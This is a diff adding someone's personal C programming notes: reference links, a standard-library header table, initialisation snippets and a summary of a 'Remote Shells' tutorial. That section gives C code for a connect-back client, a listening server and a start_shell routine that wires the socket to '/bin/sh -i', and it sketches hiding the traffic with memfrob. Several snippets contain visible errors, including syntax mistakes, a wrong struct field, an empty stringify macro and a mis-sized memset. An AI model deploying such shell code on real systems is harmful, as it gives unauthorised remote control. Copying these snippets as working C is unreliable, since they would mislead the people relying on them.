@@ -1,0 +1,304 @@
+### SOURCE: https://github.com/ericegelhaaf/programming-notes/blob/adb4079324e6993c3e23bbf683922191f8279262/languages/c/c/c.org
+
+- c2x https://habr.com/en/company/badoo/blog/512802/
+- clangd
+  - autoformat configuration options https://bcain-llvm.readthedocs.io/projects/clang/en/latest/ClangFormatStyleOptions/
+- SDL https://nullprogram.com/blog/2023/01/08/
+- https://github.com/hardik05/Damn_Vulnerable_C_Program
+- https://github.com/microsoft/checkedc
+- talks https://nullprogram.com/blog/2018/11/21/
+- https://blog.llvm.org/2011/05/what-every-c-programmer-should-know.html
+- A Guide to Undefined Behavior in C and C++, Part 1
+  https://blog.regehr.org/archives/213
+- const https://softwareengineering.stackexchange.com/questions/204500/when-and-for-what-purposes-should-the-const-keyword-be-used-in-c-for-variables
+- https://gjbex.github.io/DPD-online-book/CodingBestPractices/ErrorHandling/error_handling_c/
+- asan, ubsan, valgrind, fuzzers, libcheck, pvs
+- http://infolab.stanford.edu/~ullman/focs.html#pdfs
+- Book: http://c-faq.com/
+- C Books Reviews http://knking.com/recbooks/c.html
+- Code: http://bxr.su/OpenBSD/
+- Example: https://github.com/ltratt/hk/blob/18fcaea3e83f0c00aaef13b2882d5fa233d85de2/hk.c
+- Benchmark: https://www.wilfred.me.uk/blog/2014/10/20/the-fastest-bigint-in-the-west/
+- Benchmark: FFI https://github.com/dyu/ffi-overhead
+  - Golang is 40x slower than C
+  - Haskell,Ocaml(opt),Rust are on par with C
+  - Ocaml(C) is 4x slower
+  - LuaJit is faster than C, https://github.com/dyu/ffi-overhead/issues/2#issuecomment-405834411
+    "Using JITing to skip PLT inderection"
+    "Same on C would be -fno-plt"
+- https://fastcompression.blogspot.com/2019/01/writing-safer-c-code.html
+- https://github.com/AnthonyCalandra/modern-cpp-features
+- https://github.com/gerasdf/InsecureProgramming/
+- https://github.com/junegunn/fzf
+- https://github.com/rhysd/vim-clang-format
+- https://not.cafe/2020/10/12/getting-started-with-c-programming.html
+- https://tek256.com/posts/code-hardening/
+- http://blog.lujun9972.win/emacs-document/blog/2018/03/22/emacs-as-a-c++-ide/index.html
+  https://vxlabs.com/2016/04/11/step-by-step-guide-to-c-navigation-and-completion-with-emacs-and-the-clang-based-rtags/
+* Language
+** Sockets
+
+- CLIENT
+  s = socket()
+  opts = htons+inet_addr
+  connect(s, opts)
+
+- SERVER
+  s = socket()
+  opts = htons+htonl
+  bind(s, opts)
+  listen(s, BACKLOG)
+  accept(s) // wait
+
+** Types
+
+- =string=
+  #+begin_src c
+    char* foo = "hello" "world"; // "helloworld"
+
+    #define STR2(x)
+    #define STR(x) STR2(x)
+    #define WIDTH 300
+    #define HEIGHT 200
+    printf("%s\n", STR(WIDTH) "x" STR(HEIGHT)); // compile time int->string casting
+  #+end_src
+
+- =struct= intialization
+  #+begin_src c
+    typedef struct {
+      unsigned char c1;
+      unsigned char c2;
+    } myStruct;
+
+    myStruct _m1 = {0};
+  #+end_src
+
+- =arrays= initialization
+  - globals and static are _automatically_ initialized to zero
+  - arrays as local, either
+    #+begin_src c
+      int coll2[1024] = {0};
+      memset(coll2, 0, 1024);
+    #+end_src
+  - arrays of structs
+    #+begin_src c
+      typedef struct {
+        unsigned char a;
+        unsigned char b;
+        unsigned char c;
+      } user_struct;
+      user_struct arr[5] = {0};
+    #+end_src
+  - arrays in structs can be initialized... TODO?
+
+** Standard Library
+- https://en.cppreference.com/w/c/header
+- https://en.wikibooks.org/wiki/C_Programming/stdbool.h
+|---------------+-----+---------------------------------------------------------------------------------------------------------|
+| assert.h      |     | Conditionally compiled macro that compares its argument to zero                                         |
+| complex.h     | C99 | Complex number arithmetic                                                                               |
+| ctype.h       |     | Functions to determine the type contained in character data                                             |
+| errno.h       |     | Macros reporting error conditions                                                                       |
+| fenv.h        | C99 | Floating-point environment                                                                              |
+| float.h       |     | Limits of floating-point types                                                                          |
+| inttypes.h    | C99 | Format conversion of integer types                                                                      |
+| iso646.h      | C95 | Alternative operator spellings                                                                          |
+| limits.h      |     | Ranges of integer types                                                                                 |
+| locale.h      |     | Localization utilities                                                                                  |
+| math.h        |     | Common mathematics functions                                                                            |
+| paths.h       |     | constants with string paths of common LINUX files                                                       |
+| setjmp.h      |     | Nonlocal jumps                                                                                          |
+| signal.h      |     | Signal handling                                                                                         |
+| stdalign.h    | C11 | alignas and alignof convenience macros                                                                  |
+| stdarg.h      |     | Variable arguments                                                                                      |
+| stdatomic.h   | C11 | Atomic operations                                                                                       |
+| stdbit.h      | C23 | Macros to work with the byte and bit representations of types                                           |
+| stdbool.h     | C99 | Macros for boolean type                                                                                 |
+| stdckdint.h   | C23 | macros for performing checked integer arithmetic                                                        |
+| stddef.h      |     | Common macro definitions                                                                                |
+| stdint.h      | C99 | Fixed-width integer types                                                                               |
+| stdio.h       |     | Input/output                                                                                            |
+| stdlib.h      |     | General utilities: memory management, program utilities, string conversions, random numbers, algorithms |
+| stdnoreturn.h | C11 | noreturn convenience macro                                                                              |
+| string.h      |     | String handling                                                                                         |
+| tgmath.h      | C99 | Type-generic math (macros wrapping math.h and complex.h)                                                |
+| threads.h     | C11 | Thread library                                                                                          |
+| time.h        |     | Time/date utilities                                                                                     |
+| uchar.h       | C11 | UTF-16 and UTF-32 character utilities                                                                   |
+| wchar.h       | C95 | Extended multibyte and wide character utilities                                                         |
+| wctype.h      | C95 | Functions to determine the type contained in wide character data                                        |
+|---------------+-----+---------------------------------------------------------------------------------------------------------|
+* Codebases
+- https://github.com/curl/trurl/blob/master/trurl.c
+- https://github.com/gsingh93/display-manager
+- https://github.com/lpereira/lwan
+* Libraries
+- 0.9K https://github.com/MrFrenik/gunslinger
+  C99, header-only framework for games and multimedia applications
+- Webserver https://mongoose.ws/
+- (3K) minimal cross-platform standalone C headers
+  https://github.com/floooh/sokol
+- (800) math lib https://github.com/HandmadeMath/Handmade-Math
+- https://github.com/oz123/awesome-c
+- https://wiki.gnome.org/Projects/GLib
+- https://github.com/clibs
+- (893) https://github.com/tezc/sc
+- (80) https://github.com/ludocode/pottery
+- (24) https://github.com/begriffs/libderp
+- (10) https://github.com/lelanthran/libds
+- (480) coroutines https://github.com/tidwall/neco
+* Sanitizers
+- Static http://splint.org/
+- https://www.youtube.com/watch?v=Q2C2lP8_tNE
+- https://github.com/google/sanitizers/wiki/AddressSanitizer
+- https://valgrind.org/docs/manual/quick-start.html
+- https://gcc.gnu.org/onlinedocs/gcc/Instrumentation-Options.html
+* 0x00sec - Remote Shells
+**   I Use Cases
+https://0x00sec.org/t/remote-shells-part-i/269/1
+
+- Remote Access:
+  In the cases when is NOT possible to deploy a service like "ssh" or "telnet"
+  you can easily write your own remote shell program.
+
+- Types of Remote Shells
+  - Direct: act like servers
+  - Reverse: the application "calls back home" to a specifict server/port
+
+*** client
+
+#+begin_src c
+  #include <stdio.h>
+  #include <stdlib.h>
+  #include <unistd.h>
+  #include <sys/socket.h>
+  #include <arpa/inet.h>
+
+  int client_init(char *ip, int port) {
+    int s;
+    if ((s = socket(AF_INET; SOCK_STREAM, 0) < 0) {
+        perror("socket:");
+        exit(EXIT_FAILURE);
+    }
+
+    struct sockaddr_in serv;
+    serv.sin_family = AF_INET;
+    serv.sin_port = htons(port);
+    serv.sin_addr.s_s_addr = inet_addr(ip);
+    if (connect(s, (struct sockaddr *)&serv, sizeof(serv)) < 0) {
+      perror("connect:");
+      exit(EXIT_FAILURE);
+    }
+
+    return s;
+  }
+#+end_src
+
+*** server
+
+#+begin_src c
+  inet server_init(int port) {
+    int s;
+    if ((s = socket(AF_INET, SOCK_STREAM, 0) < 0)) {
+      perror("socket:");
+      exit(EXIT_FAILURE);
+    }
+
+    struct sockaddr_in serv;
+    serv.sin_family = AF_INET;
+    serv.sin_port = htons(port);
+    serv.sin_addr.s_addr = htonl(INADDR_ANY);
+    if ((bind(s, (struct sockaddr *)&serv, sizeof(struct sockaddr_in))) < 0) {
+      perror("bind:");
+      exit(EXIT_FAILURE);
+    }
+    if ((listen(s, 10)) < 0) {
+      perror("listen:");
+      exit(EXIT_FAILURE);
+    }
+
+    socklen_t clen = sizeof(struct sockaddr_in);
+    struct sockaddr_in client;
+    int s1;
+    if ((s1 = accept(s, (struct sockaddr *) &client, &clen)) < 0) {
+      perror("accept:");
+      exit(EXIT_FAILURE);
+    }
+    return s1;
+  }
+#+end_src
+
+*** start_shell
+
+#+begin_src c
+  int start_shell(int s) {
+    dup2(s, 0);
+    dup2(s, 1);
+    dup2(s, 2);
+    char *name[3];
+    name[0] = "/bin/sh";
+    name[1] = "-i";
+    name[2] = NULL;
+    execve(name[0], name);
+    exit(1);
+    return 0;
+  }
+#+end_src
+
+**  II Crypt your link
+- https://0x00sec.org/t/remote-shells-part-ii-crypt-your-link/306
+- https://en.wikipedia.org/wiki/Loop_unrolling
+
+- SocketPair
+  - Used to transfer data
+  - Are a pair of sockets that are immediatly connected
+    Something like runing a client and a server in 1 call
+  - Kind of like a bidirectional PIPE
+  - Convenient IPC
+
+- secure_shell()
+  | Parent       | Child              |
+  |--------------+--------------------|
+  | socketpair() |                    |
+  | fork()       | fork()             |
+  | close(sp[0]) | close(sp[1])       |
+  | async_read() | start_shell(sp[0]) |
+
+- async_read()
+  select()
+  memset()
+  read()
+  memfrob()
+
+- We use stdin socket as the input socket for async_read() on main()
+
+** III Shell Access your Phone
+- setsockopt() - SO_REUSEADDR
+* Projects
+- http://www.tendra.org/tdfc2-config/#S11.2
+  https://github.com/tendra/tendra/wiki/About
+- https://github.com/isometimes/rpi4-osdev
+** clang-format
+  https://emacs.stackexchange.com/questions/55635/how-can-i-set-up-clang-format-in-emacs
+  clang-format -style=llvm -dump-config > .clang-format
+* 6.S081: Learning by doing
+Catalog description: Design and implementation of operating systems,
+and their use as a foundation for systems programming. Topics include
+virtual memory; file systems; threads; context switches; kernels;
+interrupts; system calls; interprocess communication; coordination,
+and interaction between software and hardware. A multi-processor
+operating system for RISC-V, xv6, is used to illustrate these
+topics. Individual laboratory assignments involve extending the xv6
+operating system, for example to support sophisticated virtual memory
+features and networking.
+
+You may wonder why we are studying xv6, an operating system that
+resembles Unix v6, instead of the latest and greatest version of
+Linux, Windows, or BSD Unix. xv6 is big enough to illustrate the basic
+design and implementation ideas in operating systems. On the other
+hand, xv6 is far smaller than any modern production O/S, and
+correspondingly easier to understand. xv6 has a structure similar to
+many modern operating systems; once you've explored xv6 you will find
+that much is familiar inside kernels such as Linux.
+- https://pdos.csail.mit.edu/6.S081/2021/schedule.html
+- https://news.ycombinator.com/item?id=30094376
